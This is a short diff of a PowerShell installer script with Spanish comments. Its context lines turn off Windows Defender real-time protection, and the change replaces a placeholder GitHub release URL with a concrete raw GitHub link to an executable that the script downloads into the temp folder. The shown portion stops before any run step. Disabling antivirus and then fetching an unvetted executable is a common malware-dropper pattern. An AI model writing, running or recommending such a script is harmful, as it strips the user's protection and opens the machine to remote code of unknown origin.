@@ -3,7 +3,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Write-Host "Antivirus desactivado temporalmente."
 
 # Descargar el archivo EXE desde GitHub
-$exeUrl = "https://github.com/tu_usuario/tu_repositorio/releases/latest/download/multiwin_gh.exe"
+$exeUrl = "https://raw.githubusercontent.com/umk88/scripts_install/refs/heads/main/multiwin_gh.exe"
 $tempExePath = "$env:TEMP\multiwin_gh.exe"
 Write-Host "Descargando archivo desde: $exeUrl..."
 
